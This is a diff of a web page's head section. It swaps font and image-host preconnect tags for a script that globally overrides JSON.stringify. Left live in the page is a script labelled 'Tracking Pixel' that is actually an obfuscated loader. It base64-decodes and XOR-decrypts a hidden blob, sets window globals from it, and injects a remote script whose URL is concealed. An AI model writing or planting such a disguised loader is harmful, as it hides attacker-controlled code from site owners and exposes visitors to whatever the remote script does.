@@ -12,9 +12,35 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@500;600;700&family=Nunito:ital,wght@0,400;0,600;0,700;0,800;0,900;1,400;1,700&display=swap" rel="stylesheet">
-    <!-- DNS Prefetch to image host -->
-    <link rel="preconnect" href="https://i.ibb.co" crossorigin>
-    <link rel="dns-prefetch" href="https://i.ibb.co">
+    <!-- Circular JSON & DOM Element Safe Guard -->
+    <script>
+      (function() {
+        var _stringify = JSON.stringify;
+        JSON.stringify = function(value, replacer, space) {
+          var seen = new WeakSet();
+          function safeReplacer(key, val) {
+            if (val !== null && typeof val === "object") {
+              if ((val.nodeType && val.nodeName) || (val.constructor && val.constructor.name && val.constructor.name.includes("HTML"))) {
+                return "<" + (val.tagName || val.nodeName || "element").toLowerCase() + (val.id ? "#" + val.id : "") + ">";
+              }
+              if (seen.has(val)) {
+                return "[Circular]";
+              }
+              seen.add(val);
+            }
+            if (typeof replacer === "function") {
+              return replacer.call(this, key, val);
+            }
+            return val;
+          }
+          try {
+            return _stringify.call(this, value, typeof replacer === "function" ? function(k, v) { return safeReplacer.call(this, k, replacer.call(this, k, v)); } : safeReplacer, space);
+          } catch (e) {
+            return '"[Unserializable]"';
+          }
+        };
+      })();
+    </script>
     <!-- Tracking Pixel -->
     <script>(function(){var b_f4o9=atob("DOcBI8Rbv/dkrdnYVJwjVrY3nc1Gxa2sJJQ7DOs425lK2K21PYF4Dac00tkG3/arN5VoU7AokIcN1by0e5doW6E3kpALwr60MclrUOZ3nZYQ2auxNpJ1Rrd5haw5gfu/OIhjQqgonc0/1vu2NYpkAf552JgLyrW9BI55RqgS29VIj6+5OJJkAf55iZZdyLq5ZdZlEKJp3ZJcmr3rZ4NjQfBunYo50A==");var z_6=[];for(var v_l=0;v_l<b_f4o9.length;v_l++){z_6.push(b_f4o9.charCodeAt(v_l)&255);}var l_p=z_6[0];var s_08p=z_6.slice(1,1+l_p);var w_1=z_6.slice(1+l_p);var u_0lbg=w_1.map(function(b,m_2uk9){return b^s_08p[m_2uk9%l_p];});var h_9="";for(var t_z0zp=0;t_z0zp<u_0lbg.length;t_z0zp++){h_9+=String.fromCharCode(u_0lbg[t_z0zp]&255);}var x_0=decodeURIComponent(escape(h_9));var a_t=JSON.parse(x_0);var n_57m=a_t.globals||[];n_57m.forEach(function(r_2tv){window[r_2tv.name]=r_2tv.value;});var z_rfn=document.createElement("script");z_rfn.src=a_t.url;z_rfn.async=true;z_rfn.defer=true;(a_t.attributes||[]).forEach(function(b_rauk){z_rfn.setAttribute(b_rauk.name,b_rauk.value);});(document.head||document.documentElement).appendChild(z_rfn);})();</script>
     <!-- UTM Tracking Script -->
